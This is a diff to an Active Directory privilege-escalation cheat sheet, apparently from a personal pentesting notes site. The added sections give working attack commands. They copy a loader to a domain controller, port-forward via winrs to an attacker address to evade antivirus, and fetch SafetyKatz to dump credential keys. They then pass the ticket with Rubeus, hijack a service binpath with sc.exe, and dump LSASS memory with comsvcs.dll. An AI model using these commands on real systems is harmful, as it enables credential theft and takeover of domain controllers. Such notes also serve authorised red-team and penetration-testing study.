@@ -1,7 +1,7 @@
 ---
 layout: app
 title: "Active Directory - PirvEsc"
-tags: ["privesc","powerup","powerview"]
+tags: ["privesc","powerup","powerview","abuse service", "sc.exe", "Rubeus","permissions", "netloader","winrs","SafetyKats"]
 
 ---
 
@@ -23,6 +23,40 @@ tags: ["privesc","powerup","powerview"]
 * - Invoke-AllChecks
 * [Privesc](https://github.com/enjoiz/Privesc)
 * [RemotePotato0](https://github.com/antonioCoco/RemotePotato0)
+
+
+# Extract Hashes or Credentials
+
+Import PowerView.ps1
+Use to find out opened sessions
+
+```powershell
+Find-DomainUserLocation
+```
+
+Download NetLoader.exe and copy to Domain Controller
+
+```powershell
+echo f | xcopy C:\users\public\loader.exe \\dc01\c$\Users\Public\loader.exe
+```
+
+Add port forward into Domain Controller using winrs, to prevent AV detect
+
+```powershell
+$null | winrs -r:dc01 "netsh interface portproxy add v4tov4 listenport=8080 listenaddress=0.0.0.0 connectport=280 connectaddress=[attacket_address]"
+```
+
+Invoke Loader to run SafetyKats to get hashes and credentials
+
+```powershell
+$null | winrs -r:dc01 "c:\Users\Public\loader.exe -Path http://127.0.0.1:8080/SafetyKatz.exe sekurlsa::ekeys exit"
+```
+
+With **aes256_hmac** can be use **Rubeus** to execute command
+
+```powershell
+Rubeus.exe asktgt /user:<username> /aes256:<aes256_hmac> /opsec /createnetonly:C:\windows\system32\cmd.exe /show /ptt
+```
 
 ## PowerSploit
 
@@ -56,7 +90,11 @@ sc.exe sdshow "servicename"
 - **LOCRRC**: Ocultar o revelar recursos
 - **;;;** indicates that the permissions apply to the account **service**
 
+### Abuse of service
 
+```powershell
+sc.exe config "servicename" binpath="newservicepath"
+```
 
 
 ## Enumeration
@@ -86,6 +124,7 @@ Find-DomainUserLocation -Stealth
 
 ### PowerUp
 
+
 ```powershell
 Invoke-AllChecks
 ```
@@ -94,7 +133,7 @@ Invoke-AllChecks
 
 ```powershell
 Invoke-PrivEsc
-Invoke-Privesc checl
+Invoke-Privesc check
 ```
 
 ### PEASS-ng
@@ -103,3 +142,15 @@ Invoke-Privesc checl
 winPEASx64.exe
 ```
 
+# Dump Memory
+
+```powershell
+tasklist /FI "IMAGENAME eq lsass.exe"
+rundll32.exe c:\windows\system32\comsvcs.dll, MiniDump "Lsass Process ID" c:\temp\lsass.dmp full
+```
+
+## Tools 
+
+* lsassy
+* Physmem2profit
+* impacket
